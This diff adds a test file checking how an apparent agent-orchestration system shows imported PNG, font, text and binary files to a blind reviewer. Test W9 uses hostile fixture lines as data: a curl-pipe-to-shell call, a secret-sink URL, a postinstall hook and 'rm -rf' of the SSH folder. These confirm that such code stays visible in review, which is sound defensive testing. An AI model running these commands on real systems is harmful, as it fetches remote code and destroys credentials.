@@ -1,0 +1,468 @@
+import { execFileSync } from "node:child_process";
+import { mkdirSync, writeFileSync } from "node:fs";
+import { dirname, join } from "node:path";
+import { afterAll, describe, expect, it, vi } from "vitest";
+
+import { sha256 } from "../../src/core/digest.ts";
+import { ExecutionMode } from "../../src/domain/types.ts";
+import type { ReviewPacket } from "../../src/review/blind-review.ts";
+import * as taskImport from "../../src/run/task-import.ts";
+import { IMPORT_MAX_FILES, IMPORT_MAX_FILE_BYTES, IMPORT_MAX_TOTAL_BYTES, parseImportManifest } from "../../src/run/task-import.ts";
+import { WorkerTurnEvent, type WorkerSuccessDigestInputs, workerDiffDigest, workerSuccessDigest } from "../../src/run/worker-turn.ts";
+import type { CandidateSnapshot } from "../../src/snapshot/candidate-snapshot.ts";
+import type * as SandboxModule from "../../src/verify/sandbox.ts";
+import type { SandboxOutcome } from "../../src/verify/sandbox.ts";
+import { cleanupTempDirs, commitAll, writeFiles } from "../helpers/fixtures.ts";
+import { bindCeo, bindWorker, fixtureManifest, makeHarness, registerFixtureProject, startWorkBranch } from "../helpers/harness.ts";
+import {
+  INERT_MARKER,
+  pngWithActivePixelBytes,
+  pngWithStoredPixels,
+  ttfWithActiveInstructions,
+  ttfWithExtraTable,
+  ttfWithNameStringBytes,
+  ttfWithUnindexedGlyfPrefix,
+  VALID_TTF,
+  validPng,
+  validPngOfSize,
+  ZIP_END_OF_DIRECTORY_SIGNATURE,
+  ZIP_LOCAL_FILE_SIGNATURE,
+} from "../helpers/import-fixtures.ts";
+
+/**
+ * #1232 — a task's imported files reach the freeze and blind review bound by their manifest, never as
+ * raw bytes. The receipt a worker turn finishes with binds the import manifest (each path, size and
+ * sha256). The freeze reads that manifest from the run's SUCCEEDED receipts, reads the blob the
+ * candidate head holds at each path, and binds every import whose bytes are exactly the manifest's
+ * by path, size, sha256 and git blob in the snapshot; their patch is not materialised or digested
+ * (the candidate's tree stays exact through its head and tree digest). The reviewer gets one manifest
+ * entry per imported file in the diff, inside the packet budget, and the packet records that
+ * representation.
+ */
+
+// The official run's process is not under test here.
+vi.mock("../../src/verify/sandbox.ts", async (importOriginal) => {
+  const actual = await importOriginal<typeof SandboxModule>();
+  return { ...actual, runSandboxed: vi.fn(async (): Promise<SandboxOutcome> => ({
+    status: "PASS", exitCode: 0, signal: null, startedAt: "2026-10-27T00:00:00.000Z",
+    endedAt: "2026-10-27T00:00:00.000Z", durationMs: 1, stdout: "", stderr: "",
+    outputDigest: "sha256:fixture", outputTruncated: false, peakRssMb: 1, reasonCode: null,
+    enforcement: { worktreeIsolated: true, secretsStripped: true, networkPolicy: "deny",
+      networkEnforced: true, writeConfinement: true, readConfinement: "sensitive-paths",
+      processGroupKill: true, resourceLimitsEnforced: true, memoryLimit: "hard",
+      childContainmentEnforced: true, childContainmentReason: null, mechanism: "seatbelt" },
+  })) };
+});
+
+afterAll(cleanupTempDirs);
+
+const PACKAGE_JSON = `${JSON.stringify({ name: "fixture", private: true, scripts: { test: "node verify.js" } }, null, 2)}\n`;
+const APP_BYTES = "module.exports = () => 2;\n";
+const PNG = validPng();
+const FONT = VALID_TTF;
+/** The manifest entry the reviewer reads for a bound import. */
+const manifestLine = (entry: { path: string; size: number; sha256: string }, type: string): string => `${entry.path}: ${type}, ${entry.size} bytes, ${entry.sha256}`;
+
+const prepareRun = async (base: Record<string, string> = {}) => {
+  const harness = makeHarness();
+  writeFiles(harness.repoPath, { "package.json": PACKAGE_JSON, ...base });
+  const baseHead = commitAll(harness.repoPath, "base with config files");
+  const command = { ...fixtureManifest("x").verificationCommands[0]!, id: "test", argv: ["npm", "test"], cwd: "." };
+  const { projectId, repositoryId, identity } = await registerFixtureProject(harness, "fixture-project", {
+    verificationCommands: [command], verificationProfiles: { simple: ["test"], standard: ["test"], guarded: ["test"] },
+  });
+  bindCeo(harness);
+  const created = harness.cp.runs.create({ projectId, executionMode: ExecutionMode.STANDARD,
+    contract: { goal: "app returns 2 and ships its assets", why: "fixture", scope: ["src"], nonGoals: [], acceptance: ["app returns 2"],
+      priority: "NORMAL", humanGate: [], references: [] },
+    repositories: [{ repositoryId, repositoryRole: "primary", baseBranch: "dev" }] });
+  if (!created.allowed) throw new Error(created.message);
+  const dispatched = await harness.cp.runs.dispatch(created.value.runId);
+  if (!dispatched.allowed) throw new Error(dispatched.message);
+  return { harness, run: dispatched.value, repositoryId, identity, baseHead };
+};
+
+interface Imported { path: string; bytes: Buffer }
+
+interface ReviewOptions {
+  freezeOnly?: boolean;
+  /** Files the base commit already holds, such as an existing `.gitattributes` rule. */
+  base?: Record<string, string>;
+  /** Files the worker itself writes besides `src/app.js`; they are not imports. */
+  worker?: readonly Imported[];
+  /** The registered checkout's own `git config` settings, each `[key, value]`. */
+  config?: ReadonlyArray<readonly [string, string]>;
+}
+
+/**
+ * One task's worker turn as it finishes: the worker's change and the imported files committed on the
+ * work branch, and the SUCCEEDED receipt whose resultDigest binds the import manifest. Then the run's
+ * result is submitted: freeze, verification and blind review, with a reviewer that passes everything.
+ */
+const reviewImports = async (files: readonly Imported[], options: ReviewOptions = {}) => {
+  const { harness, run, repositoryId, identity, baseHead } = await prepareRun(options.base);
+  for (const [key, value] of options.config ?? []) execFileSync("git", ["-C", harness.repoPath, "config", key, value], { timeout: 30_000 });
+  const submitted = harness.cp.tasks.submit(run.runId, [{ key: "import", title: "import", category: "implementation" }]);
+  if (!submitted.allowed) throw new Error(submitted.message);
+  const taskId = harness.cp.tasks.ready(run.runId).find((task) => task.title === "import")!.taskId;
+  const worker = bindWorker(harness, taskId);
+  const opened = harness.cp.tasks.startExecution({ runId: run.runId, taskId, ownerBindingGeneration: run.ownerBindingGeneration!,
+    workerSessionId: worker, provider: "scripted", model: "scripted-worker", repositoryId });
+  if (!opened.allowed) throw new Error(opened.message);
+  const executionId = opened.value.executionId;
+
+  startWorkBranch(harness.repoPath);
+  writeFiles(harness.repoPath, { "src/app.js": APP_BYTES });
+  for (const file of [...files, ...(options.worker ?? [])]) {
+    mkdirSync(dirname(join(harness.repoPath, file.path)), { recursive: true });
+    writeFileSync(join(harness.repoPath, file.path), file.bytes);
+  }
+  // Up to 200 MiB of blobs: git is given the time hashing them takes, not the fixtures' default bound.
+  for (const args of [["add", "-A"], ["commit", "-q", "-m", "make app() return 2 and import its assets"]]) {
+    execFileSync("git", ["-C", harness.repoPath, ...args], {
+      timeout: 300_000,
+      env: { ...process.env, GIT_AUTHOR_NAME: "ACP Test", GIT_AUTHOR_EMAIL: "test@example.invalid", GIT_COMMITTER_NAME: "ACP Test", GIT_COMMITTER_EMAIL: "test@example.invalid", GIT_CONFIG_NOSYSTEM: "1" },
+    });
+  }
+  const head = execFileSync("git", ["-C", harness.repoPath, "rev-parse", "HEAD"], { timeout: 30_000, encoding: "utf8" }).trim();
+
+  const imports = [...files].sort((a, b) => (a.path < b.path ? -1 : 1)).map((file) => ({ path: file.path, size: file.bytes.length, sha256: sha256(file.bytes) }));
+  const parsed = files.length === 0 ? null : parseImportManifest(imports, ["src"]);
+  if (parsed !== null && !parsed.allowed) throw new Error(`the manifest is not one validation accepts: ${parsed.message}`);
+  const changed = [{ path: "src/app.js", sha256: sha256(APP_BYTES) }, ...[...imports, ...(options.worker ?? []).map((file) => ({ path: file.path, sha256: sha256(file.bytes) }))]
+    .map((entry) => ({ path: entry.path, sha256: entry.sha256 }))];
+  const diffDigest = workerDiffDigest(baseHead, changed.map((entry) => ({ ...entry, mode: "100644" as const, blob: null })));
+  const inputs = { executionId, workerSessionId: worker, sessionIncarnation: "incarnation-1", providerSessionId: "provider-session-1",
+    exitCode: 0, stdoutSha256: sha256("worker stdout"), commitHead: head, diffDigest, ...(files.length === 0 ? {} : { imports }) } as WorkerSuccessDigestInputs;
+  const resultDigest = workerSuccessDigest(inputs);
+  const recorded = harness.cp.audit.record({ kind: WorkerTurnEvent.SUCCEEDED, runId: run.runId,
+    evidence: { ...inputs, resultDigest, taskId, head: baseHead, paths: changed.map((entry) => entry.path) } });
+  if (!recorded.allowed) throw new Error(recorded.message);
+  harness.cp.tasks.finishExecution(executionId, { status: "SUCCEEDED", resultDigest });
+
+  harness.scripted.script({ match: /Candidate review/, text: JSON.stringify({ verdict: "PASS",
+    coveredFiles: changed.map((entry) => `${identity}:${entry.path}`), omittedItems: [], findings: [] }) });
+  try {
+    if (options.freezeOnly === true) {
+      const frozen = await harness.cp.pipeline.freeze(run.runId);
+      return { outcome: frozen, reviewerInput: "", packet: null, snapshot: frozen.allowed ? frozen.value : null, imports, identity, taskId, executionId };
+    }
+    const outcome = await harness.cp.pipeline.submitResult({ runId: run.runId, ownerSessionId: run.ownerSessionId!,
+      ownerBindingGeneration: run.ownerBindingGeneration!, resultSummary: "app returns 2 and ships its assets", recommendation: "merge" });
+    const reviewerInput = harness.scripted.invocations.filter((call) => call.prompt.includes("Candidate review")).map((call) => call.prompt).join("\n");
+    const packet = harness.cp.artifacts.list<ReviewPacket>(run.runId, "BLIND_REVIEW").at(-1)?.content ?? null;
+    const snapshot = harness.cp.artifacts.list<CandidateSnapshot>(run.runId, "CANDIDATE_SNAPSHOT").at(-1)?.content ?? null;
+    return { outcome, reviewerInput, packet, snapshot, imports, identity, taskId, executionId };
+  } finally {
+    harness.cp.close();
+  }
+};
+
+describe("#1232 freeze and blind review carry a task's import manifest", () => {
+  it("W5 a PNG and a font stay bound by their manifest, and the reviewer reads each one's detected type", async () => {
+    const { outcome, reviewerInput, packet, snapshot, imports, identity, taskId } = await reviewImports([
+      { path: "src/logo.png", bytes: PNG },
+      { path: "src/fonts/Inter.ttf", bytes: FONT },
+    ]);
+
+    expect(outcome, JSON.stringify(outcome)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    // The freeze bound both by their bytes at the candidate head.
+    expect(snapshot!.repositories[0]!.touchedPaths).toEqual(["src/app.js", "src/fonts/Inter.ttf", "src/logo.png"]);
+    for (const entry of imports) expect(JSON.stringify(snapshot)).toContain(entry.sha256);
+    // Not the raw binaries: each is its manifest entry, with the type the freeze detected.
+    expect(reviewerInput).not.toContain("GIT binary patch");
+    expect(reviewerInput).toContain(manifestLine(imports.find((entry) => entry.path === "src/logo.png")!, "PNG"));
+    expect(reviewerInput).toContain(manifestLine(imports.find((entry) => entry.path === "src/fonts/Inter.ttf")!, "font (TrueType)"));
+    expect(reviewerInput).toContain(`task ${taskId}`);
+    // The stored packet says how each binary path was represented.
+    expect(packet!.inputManifest.binaryArtifacts.map(({ repository, path, digest, method }) => ({ repository, path, digest, method })))
+      .toEqual(imports.map((entry) => ({ repository: identity, path: entry.path, digest: entry.sha256, method: "import-manifest" })));
+  }, 60_000);
+
+  it("W5c the stored packet carries each bound import's format, size, digest, inspection result and limits and that its content was not reviewed, lists the raw bytes as withheld, and the prompt states exactly that (review E3-2)", async () => {
+    const { outcome, reviewerInput, packet, imports, identity } = await reviewImports([
+      { path: "src/logo.png", bytes: PNG },
+      { path: "src/fonts/Inter.ttf", bytes: FONT },
+    ]);
+
+    expect(outcome, JSON.stringify(outcome)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    const artifacts = packet!.inputManifest.binaryArtifacts;
+    expect(artifacts).toEqual(imports.map((entry) => ({
+      repository: identity,
+      path: entry.path,
+      digest: entry.sha256,
+      method: "import-manifest",
+      importInspection: {
+        format: entry.path.endsWith(".png") ? "PNG" : "font (TrueType)",
+        size: entry.size,
+        sha256: entry.sha256,
+        result: "passed; bound by its manifest",
+        limits: expect.stringMatching(/structural parse.*not interpreted.*proves the bytes inert/),
+        content: expect.stringMatching(/^Content not reviewed: .*binds their identity .* only\. .*NOT .*non-executability/),
+      },
+    })));
+    expect(packet!.inputManifest.withheld).toContain("raw bytes of manifest-bound binary imports");
+    // The reviewer reads every stored field in the stored words: each file's own next to it in the diff, the
+    // limits and content statement once in the snapshot manifest (JSON in the prompt), and the withheld item.
+    for (const artifact of artifacts) {
+      const inspection = artifact.importInspection!;
+      expect(reviewerInput, artifact.path).toContain(`${artifact.path}: ${inspection.format}, ${inspection.size} bytes, ${inspection.sha256}. Inspection: ${inspection.result}.`);
+      expect(reviewerInput, artifact.path).toContain(JSON.stringify(`For each: Inspection limits: ${inspection.limits}. ${inspection.content}`).slice(1, -1));
+    }
+    expect(reviewerInput).toContain("raw bytes of manifest-bound binary imports are withheld");
+  }, 60_000);
+
+  it("W5b active opaque bytes are accepted only with the CTO attestation and exact blind-review warning", async () => {
+    const { outcome, reviewerInput } = await reviewImports([
+      { path: "src/active-pixels.png", bytes: pngWithActivePixelBytes() },
+      { path: "src/active-instructions.ttf", bytes: ttfWithActiveInstructions() },
+    ]);
+
+    expect(outcome, JSON.stringify(outcome)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    expect(reviewerInput).toContain("Opaque, potentially active binary; raw bytes not shown");
+    expect(reviewerInput).toContain("The CTO PLAN manifest authorizes these exact bytes.");
+    expect(reviewerInput).toContain("Reviewer approves path, size, digest, recognized structurally checked container type and placement only");
+    expect(reviewerInput).toContain("NOT full format conformance, byte safety, passivity, non-executability, or freedom from polyglots");
+  }, 60_000);
+
+  it("W6 the largest import set validation accepts, every file at its maximum size, freezes and is reviewed", async () => {
+    const count = Math.floor(IMPORT_MAX_TOTAL_BYTES / IMPORT_MAX_FILE_BYTES);
+    expect(count * IMPORT_MAX_FILE_BYTES).toBe(IMPORT_MAX_TOTAL_BYTES);
+    const files = Array.from({ length: count }, (_, index) => ({ path: `src/assets/blob-${index}.png`, bytes: validPngOfSize(IMPORT_MAX_FILE_BYTES, index) }));
+
+    const { outcome, reviewerInput, packet, imports } = await reviewImports(files);
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    const missing = imports.filter((entry) => !reviewerInput.includes(entry.path) || !reviewerInput.includes(entry.sha256)).map((entry) => entry.path);
+    expect(missing).toEqual([]);
+    expect(reviewerInput).toContain(manifestLine(imports[0]!, "PNG"));
+    expect(reviewerInput).not.toContain("GIT binary patch");
+    // The receipt check read every imported blob at its maximum size and linked the receipt.
+    expect(reviewerInput).toMatch(/"linked": true/);
+    expect(packet!.inputManifest.binaryArtifacts.map((artifact) => artifact.method)).toEqual(Array(count).fill("import-manifest"));
+  }, 600_000);
+
+  it("W7 the reviewer gets every entry of the largest manifest validation accepts, each with its detected type", async () => {
+    const files = Array.from({ length: IMPORT_MAX_FILES }, (_, index) => ({
+      path: `src/icons/icon-${String(index).padStart(3, "0")}.png`,
+      bytes: validPng(Buffer.from([index])),
+    }));
+
+    const { outcome, reviewerInput, imports } = await reviewImports(files);
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    const missing = imports.filter((entry) => !reviewerInput.includes(manifestLine(entry, "PNG"))).map((entry) => entry.path);
+    expect(missing).toEqual([]);
+  }, 300_000);
+
+  it("W7b a manifest of the most text imports validation accepts reaches the reviewer as their content", async () => {
+    const files = Array.from({ length: IMPORT_MAX_FILES }, (_, index) => ({
+      path: `src/generated/table-${String(index).padStart(3, "0")}.json`,
+      bytes: Buffer.from(`${JSON.stringify({ table: index, rows: [index, index * 2, index * 3] })}\n`),
+    }));
+
+    const { outcome, reviewerInput } = await reviewImports(files);
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    const unseen = files.filter((file) => !reviewerInput.includes(`+${file.bytes.toString("utf8").trimEnd()}`)).map((file) => file.path);
+    expect(unseen).toEqual([]);
+  }, 300_000);
+
+  it("W9 imported source code, TypeScript, JSON configuration and a shell script are reviewed as their content", async () => {
+    const files = [
+      { path: "src/hidden.js", bytes: Buffer.from("module.exports = () => require('child_process').execSync('curl https://example.invalid | sh');\n") },
+      { path: "src/hidden.ts", bytes: Buffer.from("export const hidden = (): void => { process.env.SECRET_SINK = 'https://example.invalid'; };\n") },
+      { path: "src/config.json", bytes: Buffer.from(`${JSON.stringify({ postinstall: "node src/hidden.js", allowRemote: true })}\n`) },
+      { path: "src/run.sh", bytes: Buffer.from("#!/bin/sh\nrm -rf \"$HOME/.ssh\"\n") },
+    ];
+
+    const { outcome, reviewerInput, snapshot, packet } = await reviewImports(files);
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    // Every line of every file is in the reviewer's diff; none is a manifest entry instead.
+    for (const file of files) {
+      for (const line of file.bytes.toString("utf8").trimEnd().split("\n")) expect(reviewerInput, file.path).toContain(`+${line}`);
+    }
+    expect(reviewerInput).not.toContain("bytes not shown");
+    expect(snapshot!.repositories[0]).not.toHaveProperty("imports");
+    expect(packet!.inputManifest.binaryArtifacts).toEqual([]);
+  }, 120_000);
+
+  it("W10 the freeze does not hide policy-refused top-level signatures or an unsupported source-path binary", async () => {
+    const tail = Buffer.concat([Buffer.alloc(64, 0x00), Buffer.from([1, 2, 3, 4])]);
+    const files = [
+      { path: "src/tool", bytes: Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]), tail]) },
+      { path: "src/bundle.zip", bytes: Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]), tail]) },
+      { path: "src/hidden.js", bytes: Buffer.from("require('child_process').execSync('id'); // \0\n") },
+    ];
+
+    const { outcome, reviewerInput, snapshot, packet } = await reviewImports(files);
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    expect(snapshot!.repositories[0]).not.toHaveProperty("imports");
+    expect(reviewerInput).not.toContain("bytes not shown");
+    // Each is the candidate's real binary patch, as any other binary change is.
+    expect(packet!.inputManifest.binaryArtifacts.map((artifact) => [artifact.path, artifact.method])).toEqual(
+      files.map((file) => [file.path, "git-binary-patch"]).sort(),
+    );
+  }, 120_000);
+  it("W10b the freeze re-checks each import: a font with an unknown table, a zip signature in a table or chunk and bytes after IEND stay in the patch", async () => {
+    // Inert fixtures: each carries a bare signature or a marker, never an archive or a program.
+    const files = [
+      { path: "src/extra-table.ttf", bytes: ttfWithExtraTable("zzzz", INERT_MARKER) },
+      { path: "src/zip-in-name.ttf", bytes: ttfWithNameStringBytes(ZIP_LOCAL_FILE_SIGNATURE) },
+      { path: "src/zip-in-idat.png", bytes: pngWithStoredPixels(Buffer.concat([ZIP_END_OF_DIRECTORY_SIGNATURE, INERT_MARKER])) },
+      { path: "src/after-iend.png", bytes: Buffer.concat([validPng(), INERT_MARKER]) },
+    ];
+
+    const { outcome, reviewerInput, snapshot, packet } = await reviewImports(files);
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    expect(snapshot!.repositories[0]).not.toHaveProperty("imports");
+    expect(reviewerInput).not.toContain("bytes not shown");
+    expect(packet!.inputManifest.binaryArtifacts.map((artifact) => [artifact.path, artifact.method])).toEqual(
+      files.map((file) => [file.path, "git-binary-patch"]).sort(),
+    );
+  }, 120_000);
+
+  /**
+   * Freezes and reviews `files`, each of which the freeze must refuse to bind: it stays its real binary
+   * patch, and the snapshot, the stored packet and the reviewer's prompt each carry its refusal reason.
+   */
+  const expectRefusedAtFreeze = async (files: ReadonlyArray<Imported & { why: RegExp }>): Promise<void> => {
+    const { outcome, reviewerInput, snapshot, packet, imports, taskId } = await reviewImports(files);
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    const repository = snapshot!.repositories[0]!;
+    expect(repository).not.toHaveProperty("imports");
+    expect(repository.refusedImports).toEqual(files.map((file, index) => ({
+      path: file.path, size: imports[index]!.size, sha256: imports[index]!.sha256, taskId, reason: expect.stringMatching(file.why),
+    })));
+    expect(reviewerInput).not.toContain("bytes not shown");
+    // Each is its real binary patch, and the stored packet says the inspection refused it and why.
+    const artifacts = packet!.inputManifest.binaryArtifacts;
+    expect(artifacts.map((artifact) => [artifact.path, artifact.method])).toEqual(files.map((file) => [file.path, "git-binary-patch"]));
+    expect(packet!.inputManifest.withheld).not.toContain("raw bytes of manifest-bound binary imports");
+    for (const [index, artifact] of artifacts.entries()) {
+      const refused = repository.refusedImports![index]!;
+      expect(artifact.importInspection, artifact.path).toEqual({
+        format: null, size: refused.size, sha256: refused.sha256, result: `refused: ${refused.reason}`,
+        limits: expect.stringMatching(/not interpreted/), content: expect.stringMatching(/^Not bound by its manifest/),
+      });
+      // The prompt states the same fields in the snapshot manifest, which is JSON in the prompt.
+      const inspection = artifact.importInspection!;
+      const stated = `task ${taskId}: ${artifact.path}: not bound, ${inspection.size} bytes, ${inspection.sha256}. Inspection: ${inspection.result}.`;
+      expect(reviewerInput, artifact.path).toContain(JSON.stringify(stated).slice(1, -1));
+      expect(reviewerInput, artifact.path).toContain(JSON.stringify(`For each: Inspection limits: ${inspection.limits}. ${inspection.content}`).slice(1, -1));
+    }
+  };
+
+  it("W10c a PNG the freeze refuses for a bare zip signature stays unbound, and the snapshot, the stored packet and the prompt carry the refusal reason (review E3-3)", async () => {
+    // Inert fixture: a bare zip signature and the marker in stored pixels.
+    await expectRefusedAtFreeze([
+      { path: "src/zip-in-idat.png", bytes: pngWithStoredPixels(Buffer.concat([ZIP_END_OF_DIRECTORY_SIGNATURE, INERT_MARKER])), why: /embedded zip archive .*signature at byte \d+/ },
+    ]);
+  }, 120_000);
+
+  it("W10d a font with glyf bytes before its first glyph location is not bound at freeze, and review reads why (review E3-1)", async () => {
+    // Inert fixture: the marker and zero padding as the whole glyf, every glyph location at its end.
+    await expectRefusedAtFreeze([
+      { path: "src/unindexed-glyf.ttf", bytes: ttfWithUnindexedGlyfPrefix(INERT_MARKER), why: /bytes before its first glyph location/ },
+    ]);
+  }, 120_000);
+
+  it("W11 the most text a task may import, at its worst-case patch expansion, freezes with the text in the patch", async () => {
+    const limits = taskImport as unknown as Record<string, unknown>;
+    expect(typeof limits["IMPORT_MAX_TEXT_BYTES"], "the text limit is exported").toBe("number");
+    // Every byte a newline: each becomes `+\n` in the patch, twice its size.
+    const files = [{ path: "src/generated/blank-lines.txt", bytes: Buffer.alloc(limits["IMPORT_MAX_TEXT_BYTES"] as number, 0x0a) }];
+
+    const { outcome, snapshot } = await reviewImports(files, { freezeOnly: true });
+
+    expect(outcome.allowed, JSON.stringify(outcome).slice(0, 2000)).toBe(true);
+    expect(snapshot!.repositories[0]!.touchedPaths).toContain("src/generated/blank-lines.txt");
+    expect(snapshot!.repositories[0]).not.toHaveProperty("imports");
+  }, 300_000);
+
+  it("W12 an imported text file under an existing `-diff` rule reaches the reviewer as its readable content, not a binary patch (review lane-e-fs-r6 P1)", async () => {
+    // The reviewer's repro: only the inert marker, imported at a path the base's attributes mark `-diff`.
+    const files = [{ path: "src/inert.js", bytes: Buffer.from(`${INERT_MARKER.toString("ascii")}\n`) }];
+
+    const { outcome, reviewerInput, snapshot, packet } = await reviewImports(files, { base: { ".gitattributes": "src/inert.js -diff\n" } });
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    expect(reviewerInput).toContain(`+${INERT_MARKER.toString("ascii")}`);
+    expect(reviewerInput).not.toContain("GIT binary patch");
+    // Text: neither bound nor refused, and no path of the packet is a binary artifact.
+    expect(snapshot!.repositories[0]).not.toHaveProperty("imports");
+    expect(snapshot!.repositories[0]).not.toHaveProperty("refusedImports");
+    expect(packet!.inputManifest.binaryArtifacts).toEqual([]);
+  }, 120_000);
+
+  it("W12b a worker's text files under `-diff`, `binary` and a binary `diff=<driver>` reach the reviewer as text, added or modified; binary content under `-diff` stays its binary patch (review lane-e-fs-r6 P1, sibling)", async () => {
+    const marker = INERT_MARKER.toString("ascii");
+    const worker = [
+      { path: "src/worker-diff.js", bytes: Buffer.from(`${marker} under -diff\n`) },
+      { path: "src/worker-binary.txt", bytes: Buffer.from(`${marker} under binary\n`) },
+      { path: "src/worker-driver.txt", bytes: Buffer.from(`${marker} under a binary driver\n`) },
+      { path: "src/legacy.js", bytes: Buffer.from(`legacy line one\n${marker} replaces line two\n`) },
+      // Inert binary content: the marker and NUL bytes.
+      { path: "src/tool.bin", bytes: Buffer.concat([INERT_MARKER, Buffer.alloc(16, 0x00)]) },
+    ];
+    const base = {
+      ".gitattributes": "src/worker-diff.js -diff\nsrc/worker-binary.txt binary\nsrc/worker-driver.txt diff=acpbinary\nsrc/legacy.js -diff\nsrc/tool.bin -diff\n",
+      "src/legacy.js": "legacy line one\nlegacy line two\n",
+    };
+
+    const { outcome, reviewerInput, packet, identity } = await reviewImports([], { base, worker, config: [["diff.acpbinary.binary", "true"]] });
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    for (const file of worker.slice(0, 3)) expect(reviewerInput, file.path).toContain(`+${file.bytes.toString("ascii").trimEnd()}`);
+    expect(reviewerInput).toContain(`-legacy line two`);
+    expect(reviewerInput).toContain(`+${marker} replaces line two`);
+    // Only the binary content is a binary patch.
+    expect(packet!.inputManifest.binaryArtifacts.map(({ repository, path, method }) => ({ repository, path, method })))
+      .toEqual([{ repository: identity, path: "src/tool.bin", method: "git-binary-patch" }]);
+  }, 120_000);
+
+  /** Inert lines behind one NUL byte: binary to git, and the source git pairs a near copy of them with. */
+  const INERT_LINES = Array.from({ length: 100 }, (_, index) => `inert line ${index + 1}\n`).join("");
+  const COPIES = { base: { "src/old.dat": `\0${INERT_LINES}` }, worker: [{ path: "src/old.dat", bytes: Buffer.from(`\0${INERT_LINES}one more\n`) }], config: [["diff.renames", "copies"]] } as const;
+
+  it("W12d an imported text file git pairs as a copy of a binary file reaches the reviewer as its readable content (review lane-e-fs-r7 E5)", async () => {
+    // The reviewer's repro: a 98% copy of a binary base file, imported as text with the inert marker.
+    const marker = INERT_MARKER.toString("ascii");
+    const files = [{ path: "src/imported.js", bytes: Buffer.from(`${INERT_LINES}${marker}\n`) }];
+
+    const { outcome, reviewerInput, snapshot, packet, identity } = await reviewImports(files, COPIES);
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    expect(reviewerInput).toContain("copy to src/imported.js");
+    // Text: neither bound nor refused, and every line of it is in the prompt.
+    expect(snapshot!.repositories[0]).not.toHaveProperty("imports");
+    expect(snapshot!.repositories[0]).not.toHaveProperty("refusedImports");
+    expect(reviewerInput).toContain(`+${marker}`);
+    expect(reviewerInput).toContain("+inert line 1\n+inert line 2\n");
+    // The copy's binary patch is the destination's, and the source's own change is its own.
+    expect(packet!.inputManifest.binaryArtifacts.map(({ repository, path, method }) => ({ repository, path, method }))).toEqual([
+      { repository: identity, path: "src/imported.js", method: "git-binary-patch" },
+      { repository: identity, path: "src/old.dat", method: "git-binary-patch" },
+    ]);
+  }, 120_000);
+
+  it("W12e a refused binary import git pairs as a copy is recorded at its own path with its refusal, not at the copy's source (review lane-e-fs-r7 E5, blind-review section path)", async () => {
+    const files = [{ path: "src/imported.dat", bytes: Buffer.from(`\0${INERT_LINES}${INERT_MARKER.toString("ascii")}\n`) }];
+
+    const { outcome, snapshot, packet, imports, taskId } = await reviewImports(files, COPIES);
+
+    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
+    const refused = snapshot!.repositories[0]!.refusedImports;
+    expect(refused?.map((entry) => entry.path)).toEqual(["src/imported.dat"]);
+    expect(packet!.inputManifest.binaryArtifacts.map((artifact) => [artifact.path, artifact.importInspection?.result ?? null])).toEqual([
+      ["src/imported.dat", `refused: ${refused![0]!.reason}`],
+      ["src/old.dat", null],
+    ]);
+    expect(packet!.inputManifest.binaryArtifacts[0]!.importInspection).toMatchObject({ size: imports[0]!.size, sha256: imports[0]!.sha256 });
+    expect(taskId).toBe(refused![0]!.taskId);
+  }, 120_000);
+});
